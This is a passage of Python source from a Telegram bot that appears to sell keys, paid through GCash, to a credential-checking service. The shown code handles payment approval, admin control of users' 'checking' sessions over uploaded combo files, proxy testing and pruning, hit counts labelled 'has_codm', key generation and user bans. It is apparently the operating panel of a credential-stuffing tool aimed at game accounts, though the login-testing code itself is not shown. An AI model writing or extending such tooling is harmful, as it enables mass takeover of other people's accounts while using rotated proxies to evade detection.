                    f"{pe(3)} Plan   : <b>{plan.get('label','')}</b> {pe(3)}\n"
                    f"{pe(2)} Key    : <code>{new_key}</code> {pe(2)}\n"
                    f"{pe(2)} Expiry : {fmt_expiry(exp_iso)} {pe(2)}\n"
                    f"{pe_sep()}\n"
                    f"{pe(5)} Salamat sa pagbili! {pe(5)}\n"
                    f"{pe(1)} Tap /start para magsimula!"
                ),
                parse_mode=ParseMode.HTML)
        except Exception as _ne:
            log.warning(f"Could not notify buyer {buyer_uid}: {_ne}")
        await query.edit_message_caption(
            caption=(
                f"{pe(3)} ✅ APPROVED — {plan.get('label','')} {pe(3)}\n"
                f"Key: <code>{new_key}</code>\n"
                f"Buyer: <code>{buyer_uid}</code>"
            ),
            parse_mode=ParseMode.HTML)
        return

    # ── GCash: admin denies payment ───────────────────────────────────────
    if data.startswith("gcash_deny:"):
        if not is_admin(tg.id, cfg):
            await query.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        plan = GCASH_PLANS.get(plan_key, {})
        try:
            await context.bot.send_message(
                chat_id=int(buyer_uid),
                text=(
                    f"{pe(3)} <b>PAYMENT DENIED</b> {pe(3)}\n"
                    f"{pe_sep()}\n"
                    f"{pe(2)} Plan: <b>{plan.get('label','')}</b> {pe(2)}\n"
                    f"{pe_sep()}\n"
                    f"{pe(1)} Di ma-verify ang iyong resibo.\n"
                    f"{pe(1)} Subukan ulit o makipag-ugnayan sa admin.\n"
                    f"{pe_sep()}\n"
                    f"{pe(2)} Tap <b>🛒 Buy Key</b> para subukan ulit. {pe(2)}"
                ),
                parse_mode=ParseMode.HTML, reply_markup=kb_no_key())
        except Exception as _ne:
            log.warning(f"Could not notify buyer {buyer_uid} of denial: {_ne}")
        await query.edit_message_caption(
            caption=(
                f"{pe(1)} ❌ DENIED — {plan.get('label','')} for <code>{buyer_uid}</code>"
            ),
            parse_mode=ParseMode.HTML)
        return

    # ── Continue or stop from /stop prompt ──────────────────────────────
    if data=="stop_continue":
        with sessions_lock: s2=active_sessions.get(uid,{})
        if not s2 or s2.get("status")!="checking":
            await query.answer("ℹ No active session.",show_alert=True); return
        # Mark as continue — bg() will see this flag and re-launch
        with sessions_lock:
            active_sessions[uid]["stop_continue"]=True
        # Actually set the stop event to interrupt current run
        s2.get("stop_event",threading.Event()).set()
        await query.edit_message_text(
            f"{pe(5)} <b>Continuing!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Partial results sent now, checking continues! {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} /check for live stats  |  /stop to stop {pe(2)}",
            parse_mode=ParseMode.HTML)
        return

    if data=="stop_confirm":
        with sessions_lock: s2=active_sessions.get(uid,{})
        if not s2 or s2.get("status")!="checking":
            await query.answer("ℹ No active session.",show_alert=True); return
        with sessions_lock: active_sessions[uid]["stop_continue"]=False
        s2.get("stop_event",threading.Event()).set()
        clear_persisted_session(uid)
        await query.edit_message_text(
            f"{pe(5)} <b>Stop Signal Sent!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Results will be zipped and sent automatically. {pe(2)}",
            parse_mode=ParseMode.HTML)
        return

    # ── Admin stop/continue callbacks ────────────────────────────────────
    if data.startswith("admstop_") or data.startswith("admcont_"):
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return

        if data=="admstop_all":
            await query.answer(" Stopping all…")
            await _adm_stop_by_filter(query.message, context.bot, "all")
            await query.delete_message()
            return
        if data=="admstop_vip":
            await query.answer(" Stopping VIP…")
            await _adm_stop_by_filter(query.message, context.bot, "vip")
            await query.delete_message()
            return
        if data=="admstop_nonvip":
            await query.answer(" Stopping non-VIP…")
            await _adm_stop_by_filter(query.message, context.bot, "nonvip")
            await query.delete_message()
            return
        if data=="admstop_oneuser":
            # Show per-user stop buttons
            with sessions_lock:
                running=[(u2,dict(s)) for u2,s in active_sessions.items() if s.get("status")=="checking"]
            if not running:
                await query.answer(" No running sessions.",show_alert=True); return
            users_db2=load_users(); btns2=[]
            for u2,s2 in running:
                ud2=users_db2.get(u2,{}); fn2=ud2.get("first_name","?"); un2=ud2.get("username","?")
                vt2="" if ud2.get("vip") else ""
                btns2.append([InlineKeyboardButton(f" {vt2} {fn2} @{un2}",callback_data=f"admstop_uid_{u2}")])
            btns2.append([InlineKeyboardButton("« Back",callback_data="admstop_back")])
            await query.edit_message_text(" <b>Stop One User</b>\n━━━━━━━━━━━━━━━━━━━━\nChoose:",
                reply_markup=InlineKeyboardMarkup(btns2),parse_mode=ParseMode.HTML)
            return
        if data.startswith("admstop_uid_"):
            target_uid=data[len("admstop_uid_"):]
            await query.answer(f" Stopping {target_uid}…")
            await _adm_stop_by_filter(query.message, context.bot, f"uid:{target_uid}")
            await query.delete_message()
            return
        if data=="admstop_back":
            # Re-show the main stop menu
            with sessions_lock:
                running2=[(u2,s) for u2,s in active_sessions.items() if s.get("status")=="checking"]
            users_db3=load_users()
            vip_c=sum(1 for u2,_ in running2 if users_db3.get(u2,{}).get("vip"))
            nvip_c=len(running2)-vip_c
            kb_b=InlineKeyboardMarkup([
                [InlineKeyboardButton(f" Stop ALL ({len(running2)})",    callback_data="admstop_all")],
                [InlineKeyboardButton(f" Stop Non-VIP ({nvip_c})",       callback_data="admstop_nonvip"),
                 InlineKeyboardButton(f" Stop VIP ({vip_c})",            callback_data="admstop_vip")],
                [InlineKeyboardButton(f" Stop One User…",                callback_data="admstop_oneuser")],
            ])
            await query.edit_message_text(
                f" <b>Stop Checking</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Running: <code>{len(running2)}</code>",
                reply_markup=kb_b,parse_mode=ParseMode.HTML)
            return

        # Continue callbacks
        if data=="admcont_all":
            await query.answer(" Resuming all…")
            await _adm_continue_by_filter(query, context.bot, "all")
            return
        if data=="admcont_vip":
            await query.answer(" Resuming VIP…")
            await _adm_continue_by_filter(query, context.bot, "vip")
            return
        if data=="admcont_nonvip":
            await query.answer(" Resuming non-VIP…")
            await _adm_continue_by_filter(query, context.bot, "nonvip")
            return
        if data=="admcont_oneuser":
            with sessions_lock:
                stopped2=[(u2,dict(s)) for u2,s in active_sessions.items()
                          if s.get("status")=="stopped_by_admin" and s.get("file") and Path(s["file"]).exists()]
            if not stopped2:
                await query.answer(" No stopped sessions.",show_alert=True); return
            users_db4=load_users(); btns3=[]
            for u2,s2 in stopped2:
                ud3=users_db4.get(u2,{}); fn3=ud3.get("first_name","?"); un3=ud3.get("username","?")
                vt3="" if ud3.get("vip") else ""
                btns3.append([InlineKeyboardButton(f" {vt3} {fn3} @{un3}",callback_data=f"admcont_uid_{u2}")])
            await query.edit_message_text(" <b>Continue One User</b>\n━━━━━━━━━━━━━━━━━━━━\nChoose:",
                reply_markup=InlineKeyboardMarkup(btns3),parse_mode=ParseMode.HTML)
            return
        if data.startswith("admcont_uid_"):
            target_uid2=data[len("admcont_uid_"):]
            await query.answer(f" Resuming {target_uid2}…")
            await _adm_continue_by_filter(query, context.bot, f"uid:{target_uid2}")
            return
        return

    # ── Admin stop/continue session buttons ──────────────────────────────
    if data.startswith("admin_stop_user_") or data.startswith("admin_cont_user_")             or data in ("admin_stop_all","admin_continue_all","admin_continue_vip","admin_continue_nonvip"):
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return
        loop2=asyncio.get_event_loop()
        users_db2=load_users()

        if data=="admin_stop_all":
            with sessions_lock:
                running2=[(u2,s2) for u2,s2 in active_sessions.items() if s2.get("status")=="checking"]
            cnt2=0
            for u2,_ in running2:
                if _stop_user_session(u2,context.bot,loop2," <b>Admin stopped your session.</b>"): cnt2+=1
            await query.answer(f" Stopped {cnt2} session(s)")
            await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(" Continue All",callback_data="admin_continue_all")]]))
            return

        if data=="admin_continue_all":
            cnt3=sum(1 for u3 in list(_admin_stopped) if _continue_user_session(u3,context.bot,loop2,context))
            await query.answer(f" Continued {cnt3} session(s)")
            await query.edit_message_reply_markup(reply_markup=None)
            return

        if data=="admin_continue_vip":
            cnt4=0
            for u4 in list(_admin_stopped):
                if users_db2.get(u4,{}).get("vip"):
                    if _continue_user_session(u4,context.bot,loop2,context): cnt4+=1
            await query.answer(f" Continued {cnt4} VIP session(s)")
            await query.edit_message_reply_markup(reply_markup=None)
            return

        if data=="admin_continue_nonvip":
            cnt5=0
            for u5 in list(_admin_stopped):
                if not users_db2.get(u5,{}).get("vip"):
                    if _continue_user_session(u5,context.bot,loop2,context): cnt5+=1
            await query.answer(f" Continued {cnt5} non-VIP session(s)")
            await query.edit_message_reply_markup(reply_markup=None)
            return

        if data.startswith("admin_stop_user_"):
            target2=data[len("admin_stop_user_"):]
            ok2=_stop_user_session(target2,context.bot,loop2," <b>Admin stopped your session.</b>\nYour file is safe.")
            uname2=users_db2.get(target2,{}).get("username","?")
            await query.answer(" Stopped" if ok2 else "Not running")
            if ok2:
                # Replace stop button with continue button
                new_kb=[]
                old_kb=query.message.reply_markup.inline_keyboard if query.message.reply_markup else []
                for row in old_kb:
                    new_row=[]
                    for btn in row:
                        if btn.callback_data==data:
                            new_row.append(InlineKeyboardButton(f" Continue @{uname2}",callback_data=f"admin_cont_user_{target2}"))
                        else:
                            new_row.append(btn)
                    new_kb.append(new_row)
                try: await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(new_kb))
                except: pass
            return

        if data.startswith("admin_cont_user_"):
            target3=data[len("admin_cont_user_"):]
            ok3=_continue_user_session(target3,context.bot,loop2,context)
            uname3=users_db2.get(target3,{}).get("username","?")
            await query.answer(" Continued" if ok3 else "No paused session found")
            if ok3:
                new_kb2=[]
                old_kb2=query.message.reply_markup.inline_keyboard if query.message.reply_markup else []
                for row in old_kb2:
                    new_row2=[]
                    for btn in row:
                        if btn.callback_data==data:
                            new_row2.append(InlineKeyboardButton(f" Stop @{uname3}",callback_data=f"admin_stop_user_{target3}"))
                        else:
                            new_row2.append(btn)
                    new_kb2.append(new_row2)
                try: await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(new_kb2))
                except: pass
            return

    # ── Proxy check inline buttons ───────────────────────────────────────
    if data.startswith("chkprx_"):
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return
        parts=data.split("_",2)
        action=parts[1] if len(parts)>1 else ""
        fname_cb=parts[2] if len(parts)>2 else ""
        fpath_cb=PROXY_DIR/fname_cb if fname_cb else None

        if action=="menu":
            if not fpath_cb or not fpath_cb.exists():
                await query.answer(" File not found.",show_alert=True); return
            with open(fpath_cb,"r",encoding="utf-8",errors="ignore") as f:
                total_cb=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
            kb=InlineKeyboardMarkup([
                [InlineKeyboardButton(" Sample (5)",callback_data=f"chkprx_sample_{fname_cb}")],
                [InlineKeyboardButton(" Check ALL", callback_data=f"chkprx_all_{fname_cb}")],
                [InlineKeyboardButton(" Specific line…",callback_data=f"chkprx_askline_{fname_cb}")],
                [InlineKeyboardButton("« Back",callback_data="chkprx_back_")],
            ])
            await query.edit_message_text(
                f" <b>{fname_cb}</b>  ·  <code>{total_cb:,}</code> proxies\n━━━━━━━━━━━━━━━━━━━━\nChoose check mode:",
                reply_markup=kb,parse_mode=ParseMode.HTML)
            return

        if action=="back":
            pf_cb=sorted(PROXY_DIR.glob("*.txt")); btns_cb=[]
            lines_cb=[" <b>Proxy Files</b>\n━━━━━━━━━━━━━━━━━━━━"]
            for p in pf_cb:
                try:
                    with open(p,"r",encoding="utf-8",errors="ignore") as f:
                        cnt=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
                    lines_cb.append(f" <code>{p.name}</code>  ·  {cnt:,} proxies")
                except: lines_cb.append(f" <code>{p.name}</code>")
                btns_cb.append([InlineKeyboardButton(f" {p.name}",callback_data=f"chkprx_menu_{p.name}")])
            await query.edit_message_text("\n".join(lines_cb),reply_markup=InlineKeyboardMarkup(btns_cb),parse_mode=ParseMode.HTML)
            return

        if action=="askline":
            if not fpath_cb or not fpath_cb.exists():
                await query.answer(" File not found.",show_alert=True); return
            with open(fpath_cb,"r",encoding="utf-8",errors="ignore") as f:
                total_cb2=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
            with sessions_lock:
                active_sessions.setdefault(uid,{})
                active_sessions[uid]["awaiting_proxy_line"]=fname_cb
                active_sessions[uid]["awaiting_proxy_line_total"]=total_cb2
            await query.edit_message_text(
                f" <b>Enter Line Number</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"File: <code>{fname_cb}</code>  ·  <code>{total_cb2:,}</code> proxies\n"
                f"Send a number (1–{total_cb2:,}) to check that proxy line.",
                parse_mode=ParseMode.HTML)
            return

        if action=="rmdeadlines":
            # Remove dead+error lines from ONE file (re-test to be sure)
            if not fpath_cb or not fpath_cb.exists():
                await query.answer(" File not found.",show_alert=True); return
            await query.answer(" Removing dead & error lines…")
            await query.edit_message_text(
                f" <b>Cleaning <code>{fname_cb}</code>…</b>\nRe-testing all proxies, please wait.",
                parse_mode=ParseMode.HTML)
            with open(fpath_cb,"r",encoding="utf-8",errors="ignore") as f:
                proxy_lines_cb=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
            from concurrent.futures import ThreadPoolExecutor as _TPED,as_completed as _ascd
            rm_map={}
            with _TPED(max_workers=20) as ex2:
                futs2={ex2.submit(_test_proxy_sync,ln):i for i,ln in enumerate(proxy_lines_cb)}
                for fut2 in _ascd(futs2):
                    i2=futs2[fut2]
                    try: ok2,_=fut2.result(); rm_map[i2]=ok2
                    except: rm_map[i2]=False
            working_cb=[proxy_lines_cb[i] for i,ok in sorted(rm_map.items()) if ok]
            dead_cb_n=len(proxy_lines_cb)-len(working_cb)
            if not working_cb:
                await query.edit_message_text(
                    f" <b>All proxies dead/error</b>\n<code>{fname_cb}</code> kept unchanged.\nUse /removeproxy to delete it.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")]]),
                    parse_mode=ParseMode.HTML); return
            with open(fpath_cb,"w",encoding="utf-8") as f:
                for ln in working_cb: f.write(ln+"\n")
            await query.edit_message_text(
                f" <b>Dead & Error Lines Removed!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" <code>{fname_cb}</code>\n"
                f" Kept    : <code>{len(working_cb):,}</code> working\n"
                f" Removed : <code>{dead_cb_n:,}</code> dead/error lines",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")]]),
                parse_mode=ParseMode.HTML)
            return

        if action=="rmdeadlines_ALL":
            # ── Remove dead+error lines from ALL proxy files at once ───────
            if not is_admin(tg.id,cfg):
                await query.answer(" Admin only.",show_alert=True); return
            all_pf=sorted(PROXY_DIR.glob("*.txt"))
            if not all_pf:
                await query.answer(" No proxy files.",show_alert=True); return
            await query.edit_message_text(
                f" <b>Cleaning ALL {len(all_pf)} proxy file(s)…</b>\nTesting every line, please wait.",
                parse_mode=ParseMode.HTML)
            from concurrent.futures import ThreadPoolExecutor as _TPEALL,as_completed as _ascALL
            total_removed=0; total_kept=0; file_lines=[]
            for pf_all in all_pf:
                try:
                    with open(pf_all,"r",encoding="utf-8",errors="ignore") as f:
                        lines_all=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
                    if not lines_all:
                        file_lines.append(f" <code>{pf_all.name}</code> — empty, skipped")
                        continue
                    rm_map2={}
                    with _TPEALL(max_workers=20) as ex3:
                        futs3={ex3.submit(_test_proxy_sync,ln):i for i,ln in enumerate(lines_all)}
                        for fut3 in _ascALL(futs3):
                            i3=futs3[fut3]
                            try: ok3,_=fut3.result(); rm_map2[i3]=ok3
                            except: rm_map2[i3]=False
                    working3=[lines_all[i] for i,ok in sorted(rm_map2.items()) if ok]
                    removed3=len(lines_all)-len(working3)
                    total_removed+=removed3; total_kept+=len(working3)
                    if working3:
                        with open(pf_all,"w",encoding="utf-8") as f:
                            for ln in working3: f.write(ln+"\n")
                        file_lines.append(f" <code>{pf_all.name}</code>  kept:{len(working3):,}  removed:{removed3:,}")
                    else:
                        file_lines.append(f" <code>{pf_all.name}</code>  all dead — file kept unchanged")
                except Exception as e:
                    file_lines.append(f" <code>{pf_all.name}</code>  error: {e}")
            summary=("\n".join(file_lines))
            await query.edit_message_text(
                f" <b>All Files Cleaned!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Total removed : <code>{total_removed:,}</code> dead/error lines\n"
                f" Total kept    : <code>{total_kept:,}</code> working\n"
                f"━━━━━━━━━━━━━━━━━━━━\n{summary}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back to Proxy",callback_data="adm_proxy")]]),
                parse_mode=ParseMode.HTML)
            return

        if action in ("sample","all"):
            if not fpath_cb or not fpath_cb.exists():
                await query.answer(" File not found.",show_alert=True); return
            await query.answer(" Checking…")
            from concurrent.futures import ThreadPoolExecutor as _TPECB, as_completed as _ASCCB

            with open(fpath_cb,"r",encoding="utf-8",errors="ignore") as f:
                all_cb=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
            total_cb=len(all_cb)

            if action=="sample":
                idx_s=[0,total_cb//4,total_cb//2,3*total_cb//4,total_cb-1]
                sample=[all_cb[i] for i in dict.fromkeys(idx_s) if i<total_cb][:5]
                res_s=[]
                lp=asyncio.get_event_loop()
                for ln in sample:
                    ok_s,err_s=await lp.run_in_executor(None,_test_proxy_sync,ln)
                    label=f"" if ok_s else f" ({err_s})" if err_s else ""
                    res_s.append(f"{label} Line {all_cb.index(ln)+1}: <code>{ln[:50]}</code>")
                wk=sum(1 for r in res_s if r.startswith(""))
                out_s=(f"{'' if wk==len(sample) else ('' if wk>0 else '')} <b>{fname_cb}</b> — {wk}/{len(sample)} working\n"
                       f"━━━━━━━━━━━━━━━━━━━━\n"+"\n".join(res_s))
                if wk==0: out_s+="\n━━━━━━━━━━━━━━━━━━━━\n All sampled dead/error. Use Check ALL to verify."
                kb_s=InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")]])
                try: await query.edit_message_text(out_s,reply_markup=kb_s,parse_mode=ParseMode.HTML)
                except: pass

            else:  # all
                await query.edit_message_text(
                    f" Checking ALL <code>{total_cb:,}</code> proxies from <code>{fname_cb}</code>…\nThis may take a while.",
                    parse_mode=ParseMode.HTML)
                res_map={}
                def _ci_cb(il):
                    i,ln=il; ok_r,err_r=_test_proxy_sync(ln); return i,ln,ok_r,err_r
                with _TPECB(max_workers=20) as ex:
                    futs={ex.submit(_ci_cb,(i,ln)):i for i,ln in enumerate(all_cb,1)}
                    for fut in _ASCCB(futs):
                        try:
                            i,ln,ok_r,err_r=fut.result(); res_map[i]=(ln,ok_r,err_r)
                        except: pass
                working_a=[(i,ln) for i,(ln,ok_r,_) in sorted(res_map.items()) if ok_r]
                dead_a   =[(i,ln,err_r) for i,(ln,ok_r,err_r) in sorted(res_map.items()) if not ok_r]
                tok=len(working_a); pct=int(tok/total_cb*100) if total_cb else 0
                out_lines=[
                    f"{'' if pct>=80 else ''} <b>{fname_cb}</b> — {tok}/{total_cb} working ({pct}%)",
                    f"━━━━━━━━━━━━━━━━━━━━",
                    f" Working : <code>{tok:,}</code>",
                    f" Dead/Error : <code>{len(dead_a):,}</code>",
                ]
                if dead_a:
                    # Group errors by type
                    from collections import Counter as _Ctr
                    err_ctr=_Ctr(err_r for _,_,err_r in dead_a if err_r)
                    if err_ctr:
                        err_summary=", ".join(f"{v}x {k}" for k,v in err_ctr.most_common(4))
                        out_lines.append(f" Errors: {err_summary}")
                    out_lines.append("━━━━━━━━━━━━━━━━━━━━")
                    dp="\n".join(f"   Line {i}: <code>{ln[:45]}</code> — {err_r}" for i,ln,err_r in dead_a[:15])
                    if len(dead_a)>15: dp+=f"\n  … and {len(dead_a)-15} more dead/error lines"
                    out_lines+=["<b>Dead / Error proxies:</b>",dp,"━━━━━━━━━━━━━━━━━━━━"]
                    kb_a=InlineKeyboardMarkup([
                        [InlineKeyboardButton(f" Remove {len(dead_a):,} dead/error lines (this file)",
                                             callback_data=f"chkprx_rmdeadlines_{fname_cb}")],
                        [InlineKeyboardButton(f" Remove dead/error from ALL files",
                                             callback_data="chkprx_rmdeadlines_ALL_")],
                        [InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")],
                    ])
                else:
                    kb_a=InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data=f"chkprx_menu_{fname_cb}")]])
                full="\n".join(out_lines)
                if len(full)>4000: full=full[:4000]+"…"
                try: await query.edit_message_text(full,reply_markup=kb_a,parse_mode=ParseMode.HTML)
                except: pass
            return
        return

    # ── Open admin panel from /start button ─────────────────────────────
    if data=="open_admin_panel":
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return
        cfg2=load_config(); users2=load_users()
        await query.edit_message_text(
            _admin_status_text(cfg2, users2),
            reply_markup=_admin_main_kb(cfg2),
            parse_mode=ParseMode.HTML)
        return

    # ── Admin sub-menu callbacks ──────────────────────────────────────────
    if data.startswith("adm_"):
        if not is_admin(tg.id,cfg):
            await query.answer(" Admin only.",show_alert=True); return

        BACK = [[InlineKeyboardButton("« Back",callback_data="adm_back")]]

        # ── Back to main menu ─────────────────────────────────────────────
        if data=="adm_back":
            cfg2=load_config(); users2=load_users()
            await query.edit_message_text(
                _admin_status_text(cfg2, users2),
                reply_markup=_admin_main_kb(cfg2),
                parse_mode=ParseMode.HTML)
            return

        # ── Toggle lock ───────────────────────────────────────────────────
        if data=="adm_toggle_lock":
            cfg2=load_config()
            cfg2["locked"]=not cfg2.get("locked",False); save_config(cfg2)
            users2=load_users()
            if cfg2["locked"]:
                with sessions_lock:
                    for uid2,s2 in active_sessions.items():
                        if s2.get("status")=="checking" and not users2.get(uid2,{}).get("vip"):
                            s2["stop_event"].set()
            await query.answer(" Locked!" if cfg2["locked"] else " Unlocked!")
            await query.edit_message_text(
                _admin_status_text(cfg2, users2),
                reply_markup=_admin_main_kb(cfg2),
                parse_mode=ParseMode.HTML)
            return

        # ── Refresh panel ─────────────────────────────────────────────────
        if data=="adm_refresh":
            cfg2=load_config()
            saved_mc=cfg2.get("max_concurrent",5)
            if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
            try:
                import dec_tyrantv12 as _dty2
                _dty2.geo_rotator.__init__()
            except: pass
            users2=load_users()
            await query.answer(" Refreshed!")
            await query.edit_message_text(
                _admin_status_text(cfg2, users2),
                reply_markup=_admin_main_kb(cfg2),
                parse_mode=ParseMode.HTML)
            return

        # ── Stats ─────────────────────────────────────────────────────────
        if data=="adm_stats":
            cfg2=load_config(); users2=load_users(); keys2=load_keys()
            tu=len(users2); au=sum(1 for u in users2.values() if u.get("activated"))
            bu=sum(1 for u in users2.values() if u.get("banned"))
            vu=sum(1 for u in users2.values() if u.get("vip"))
            tc=sum(u.get("total_checked",0) for u in users2.values())
            with sessions_lock: live2=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
            pf2=list(PROXY_DIR.glob("*.txt")); tp2=0
            for pf3 in pf2:
                try:
                    with open(pf3,"r",encoding="utf-8",errors="ignore") as fh:
                        tp2+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
                except: pass
            await query.edit_message_text(
                f" <b>Statistics</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Total Users   : <code>{tu}</code>\n"
                f" Activated     : <code>{au}</code>\n"
                f" Banned        : <code>{bu}</code>\n"
                f" VIP           : <code>{vu}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f" Running       : <code>{live2}/{MAX_CONCURRENT_CHECKERS}</code>\n"
                f" Total checked : <code>{tc:,}</code>\n"
                f" Keys total    : <code>{len(keys2)}</code>\n"
                f" Keys used     : <code>{sum(1 for k in keys2.values() if k.get('used_by'))}</code>\n"
                f" Proxies       : <code>{tp2:,}</code> in <code>{len(pf2)}</code> file(s)\n"
                f" Locked        : <code>{'YES ' if cfg2.get('locked') else 'No '}</code>",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        # ── Running sessions ──────────────────────────────────────────────
        if data=="adm_running":
            with sessions_lock:
                running2=[(u2,s2) for u2,s2 in active_sessions.items() if s2.get("status")=="checking"]
            users2=load_users()
            if not running2:
                await query.edit_message_text(
                    " <b>No active sessions</b>",
                    reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
                return
            lines2=[f" <b>Running ({len(running2)})</b>\n━━━━━━━━━━━━━━━━━━━━"]
            for u2,s2 in running2:
                ud2=users2.get(u2,{}); fn2=ud2.get("first_name","?"); un2=ud2.get("username","?")
                combo2=Path(s2.get("file","")).name if s2.get("file") else "N/A"
                ls3=s2.get("live_stats"); st3=ls3.get_stats() if ls3 else {}
                orig2=s2.get("orig_total",0)
                try:
                    with open(s2["file"],"r",encoding="utf-8",errors="ignore") as _f2:
                        rem2=sum(1 for ln in _f2 if ln.strip() and not ln.strip().startswith("==="))
                except: rem2=0
                done2=max(0,orig2-rem2) if orig2 else 0
                pct2=int(done2/orig2*100) if orig2 else 0
                lines2.append(f"\n <b>{fn2}</b> @{un2}\n {combo2}\n"
                              f" {done2}/{orig2} ({pct2}%)   {st3.get('has_codm',0)} hits")
            await query.edit_message_text(
                "\n".join(lines2),
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        # ── Keys sub-menu ─────────────────────────────────────────────────
        if data=="adm_keys":
            await _adm_edit(query,
                " <b>Keys</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                "Tap to generate a key or remove keys.",
                _admin_keys_kb())
            return

        if data.startswith("adm_genkey_"):
            parts3=data.split("_"); dtype3=parts3[2]; dval3=int(parts3[3]); mu3=int(parts3[4])
            exp3=compute_expiry(dtype3,dval3)
            import uuid as _uuid
            key3=f"TYRANT-{_uuid.uuid4().hex[:8].upper()}-{_uuid.uuid4().hex[:4].upper()}"
            dd3={"hours":f"{dval3}h","days":f"{dval3}d","months":f"{dval3}mo","lifetime":"Lifetime"}[dtype3]
            keys3=load_keys()
            keys3[key3]={"max_users":mu3,"used_by":[],"duration_type":dtype3,"duration_val":dval3,
                         "expires_at":exp3,"created_at":datetime.now().isoformat(),"created_by":tg.id}
            save_keys(keys3)
            await query.answer(" Key generated!")
            await query.edit_message_text(
                f" <b>Key Generated!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{key3}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Duration : <b>{dd3}</b>\n"
                f" Expires  : {fmt_expiry(exp3)}\n"
                f" Max users: <code>{mu3}</code>",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_removekey_info":
            await query.answer("/remove_key <id> | all | vip | nonvip", show_alert=True)
            return

        # ── Users sub-menu ────────────────────────────────────────────────
        if data=="adm_users":
            await _adm_edit(query,
                " <b>Users</b>\n━━━━━━━━━━━━━━━━━━━━\nManage users:",
                _admin_users_kb())
            return

        if data in ("adm_info_addvip","adm_info_removevip","adm_info_ban","adm_info_unban","adm_info_broadcast"):
            cmd_hints={"adm_info_addvip":"/addvip <id>","adm_info_removevip":"/removevip <id>",
                       "adm_info_ban":"/ban_user <id>","adm_info_unban":"/unban_user <id>",
                       "adm_info_broadcast":"/broadcast <message>"}
            await query.answer(cmd_hints.get(data,""), show_alert=True)
            return

        if data.startswith("adm_rk_"):
            mode3=data[7:]
            users3=load_users(); cnt3=0
            for uid3 in list(users3.keys()):
                u3=users3[uid3]; iv3=u3.get("vip",False); ia3=u3.get("activated",False)
                match3=(mode3=="all" and ia3) or (mode3=="vip" and ia3 and iv3) or (mode3=="nonvip" and ia3 and not iv3)
                if match3:
                    users3[uid3].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); cnt3+=1
                    with sessions_lock:
                        if uid3 in active_sessions: active_sessions[uid3].get("stop_event",threading.Event()).set()
                    try: await context.bot.send_message(chat_id=int(uid3),text=" <b>Access Revoked</b>\n\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
                    except: pass
            save_users(users3)
            label3={"all":"All","vip":"VIP","nonvip":"Non-VIP"}[mode3]
            await query.answer(f" Removed {cnt3} keys")
            await query.edit_message_text(
                f" <b>Keys Removed ({label3})</b>\n<code>{cnt3}</code> user(s) revoked.",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_allusers":
            users3=load_users()
            ac3=sum(1 for u in users3.values() if u.get("activated"))
            bc3=sum(1 for u in users3.values() if u.get("banned"))
            vc3=sum(1 for u in users3.values() if u.get("vip"))
            lines3=[f" <b>Users ({len(users3)})</b>  {ac3}  {bc3}  {vc3}\n━━━━━━━━━━━━━━━━━━━━"]
            for uid3,u3 in sorted(users3.items(),key=lambda x:x[1].get("joined",""),reverse=True):
                st3="" if u3.get("banned") else ("" if u3.get("vip") else ("" if u3.get("activated") else ""))
                lines3.append(f"{st3} <code>{uid3}</code> @{u3.get('username','?')}  {u3.get('total_checked',0):,} checked")
            msg3="\n".join(lines3)
            for chunk in [msg3[i:i+4000] for i in range(0,len(msg3),4000)]:
                await context.bot.send_message(chat_id=query.message.chat_id,text=chunk,parse_mode=ParseMode.HTML)
            return

        # ── Proxy sub-menu ────────────────────────────────────────────────
        if data=="adm_proxy":
            pf4=sorted(PROXY_DIR.glob("*.txt")); tp4=0
            for pf5 in pf4:
                try:
                    with open(pf5,"r",encoding="utf-8",errors="ignore") as fh:
